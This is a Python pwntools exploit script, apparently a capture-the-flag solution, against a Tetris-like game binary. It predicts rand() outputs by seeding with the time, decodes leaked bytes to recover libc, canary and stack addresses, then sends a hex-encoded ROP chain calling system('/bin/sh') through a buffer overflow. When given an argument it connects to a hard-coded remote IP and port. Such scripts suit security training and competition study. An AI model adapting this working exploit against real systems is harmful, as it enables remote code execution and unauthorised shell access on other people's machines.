#!/usr/bin/python
import ctypes
import sys
from pwn import *

ctypes.cdll.LoadLibrary("libc.so.6")
lc = ctypes.CDLL("libc.so.6")

LOCAL = True

HOST = "35.194.113.63"
PORT = 10004
PROCESS = "./game"

f = open("debug", "wb")

CHARSET = "0123456789abcdef"
CURBLOCK = "AABBCCDD"
SHAPES = []
BLEAKS = []

SHAPE_IDX = -1
BLEAK_IDX = -1
MOVE_IDX = 0

LEAKS = [
    [0x60, 0, 0, 0, 0, 0x7f, 0x0, 0],   # SYSTEM
    [0, 0, 0, 0, 0, 0, 0, 0],           # CANARY
    [0, 0, 0, 0, 0, 0, 0, 0],           # RBP
    [0, 0, 0, 0, 0, 0, 0, 0],           # PIE1
    [0, 0, 0, 0, 0, 0, 0, 0],           # STACK
    [0, 0, 0, 0, 0, 0, 0, 0],           # PIE2
]

MOVES = [
    "aaaaaaa ",
    "aa ",
    "dd ",
    "ddddddd "
]

ansi_escape = re.compile(r'''
    \x1B
    (?:
        [@-Z\\-_]
    |
        \[
        [0-?]*
        [ -/]*
        [@-~]
    )
    ''', re.VERBOSE)


def debug(msg):
    if len(msg.strip()) > 0:
        f.write(msg)
        f.write("\n")
        f.flush()


def receive():
    data = r.recv(10000)
    print data
    decoded = ansi_escape.sub('', data)
    parsed = ''.join([i for i in decoded if i in CHARSET]).strip()
    return data, decoded, parsed


def receive_new_block():
    global CURBLOCK
    cur_dir = 0

    while True:
        data, decoded, parsed = receive()

        if len(parsed) == 2*4:
            # possible new block
            if parsed != CURBLOCK:
                # found new block
                debug("Found new block: %s" % parsed)
                CURBLOCK = parsed
                return CURBLOCK


def push():
    global SHAPES, BLEAKS
    SHAPES.append(lc.rand() % 7)


def pop():
    global SHAPES, BLEAKS, SHAPE_IDX, BLEAK_IDX
    BLEAKS.append(lc.rand() % 6)

    SHAPE_IDX += 1
    BLEAK_IDX += 1
    push()


def get_addr(leak):
    result = ""
    for v in leak:
        result += chr(v)

    return u64(result)


def parse_block(block, shape, bleak):
    global LEAKS

    debug("Parse_block: %s / %d / %d" % (block, shape, bleak))

    bytes = []

    for i in range(4):
        bytes.append((block[i*2:(i*2)+2]).decode("hex"))

    if shape == 0:
        LEAKS[bleak][6] = ord(bytes[0]) ^ 0x41
        LEAKS[bleak][7] = ord(bytes[1]) ^ 0x41
        LEAKS[bleak][3] = ord(bytes[2]) ^ 0x41
        LEAKS[bleak][4] = ord(bytes[3]) ^ 0x41
    elif shape == 1:
        LEAKS[bleak][2] = ord(bytes[0]) ^ 0x41
        LEAKS[bleak][3] = ord(bytes[1]) ^ 0x41
        LEAKS[bleak][4] = ord(bytes[2]) ^ 0x41
        LEAKS[bleak][5] = ord(bytes[3]) ^ 0x41
    elif shape == 2:
        LEAKS[bleak][5] = ord(bytes[0]) ^ 0x41
        LEAKS[bleak][0] = ord(bytes[1]) ^ 0x41
        LEAKS[bleak][1] = ord(bytes[2]) ^ 0x41
        LEAKS[bleak][2] = ord(bytes[3]) ^ 0x41
    elif shape == 3:
        LEAKS[bleak][0] = ord(bytes[1]) ^ 0x41
        LEAKS[bleak][1] = ord(bytes[2]) ^ 0x41
        LEAKS[bleak][2] = ord(bytes[3]) ^ 0x41
        LEAKS[bleak][3] = ord(bytes[0]) ^ 0x41
    elif shape == 4:
        LEAKS[bleak][4] = ord(bytes[0]) ^ 0x41
        LEAKS[bleak][0] = ord(bytes[1]) ^ 0x41
        LEAKS[bleak][1] = ord(bytes[2]) ^ 0x41
        LEAKS[bleak][2] = ord(bytes[3]) ^ 0x41
    elif shape == 5:
        LEAKS[bleak][0] = ord(bytes[0]) ^ 0x41
        LEAKS[bleak][4] = ord(bytes[1]) ^ 0x41
        LEAKS[bleak][5] = ord(bytes[2]) ^ 0x41
        LEAKS[bleak][1] = ord(bytes[3]) ^ 0x41
    elif shape == 6:
        LEAKS[bleak][6] = ord(bytes[0]) ^ 0x41
        LEAKS[bleak][3] = ord(bytes[1]) ^ 0x41
        LEAKS[bleak][4] = ord(bytes[2]) ^ 0x41
        LEAKS[bleak][1] = ord(bytes[3]) ^ 0x41


def debug_leaks():
    debug("-------------------------------------")
    debug("SYSTEM : %s" % hex(get_addr(LEAKS[0])))
    debug("CANARY : %s" % hex(get_addr(LEAKS[1])))
    debug("RBP    : %s" % hex(get_addr(LEAKS[2])))
    debug("PIE1   : %s" % hex(get_addr(LEAKS[3])))
    debug("STACK  : %s" % hex(get_addr(LEAKS[4])))
    debug("PIE2   : %s" % hex(get_addr(LEAKS[5])))
    debug("-------------------------------------")


def drop_block():
    global MOVE_IDX
    r.sendline(MOVES[MOVE_IDX])

    MOVE_IDX += 1
    if MOVE_IDX > 3:
        MOVE_IDX = 0


def system_leak_finished():
    global LEAKS

    if 0 in LEAKS[0][:6]:
        return False

    return True


def exploit(r):
    global SHAPES, BLEAKS, CURBLOCK

    # initialize seed for rand
    lc.srand(lc.time(None))

    # initialize shape and bleak arrays
    push()
    push()
    push()
    pop()

    for i in range(len(SHAPES)):
        debug("Shape {}: {}".format(i, SHAPES[i]))

    for i in range(len(BLEAKS)):
        debug("Bleak {}: {}".format(i, BLEAKS[i]))

    # receive playfield drawing
    print r.recvuntil("HJKL")
    print r.recvuntil("HJKL")

    # receive blocks and update leaks
    while True:
        # receive next block
        block = receive_new_block()

        # recalculate leaks from block and current bleak value
        parse_block(block, SHAPES[SHAPE_IDX], BLEAKS[BLEAK_IDX])

        # print leaks to debug output
        debug_leaks()

        if system_leak_finished():
            break

        # send input to drop block
        drop_block()

        CURBLOCK = "AAAAAAAA"

        # fetch next block from queue
        pop()

    # calculate libc base
    libc.address = get_addr(LEAKS[0]) - libc.symbols["system"]
    debug("LIBC   : %s" % hex(libc.address))

    # play manually to get a score > 0
    r.interactive()

    # send ropchain to reward
    POPRDI = libc.address + 0x2a3e5
    RET = libc.address + 0xf872e

    ropchain = p64(POPRDI)
    ropchain += p64(next(libc.search("/bin/sh")))
    ropchain += p64(RET)
    ropchain += p64(libc.symbols["system"])

    payload = "aa"*0x48                 # fill buffer
    payload += "`"*32                   # skip canary+rbp
    payload += ropchain.encode("hex")   # append ropchain

    r.sendline(payload)

    r.interactive()

    return


if __name__ == "__main__":
    # e = ELF("./game")
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        # r = process("./game")
        r = process("./run_local.sh")
        print(util.proc.pidof(r))

    exploit(r)
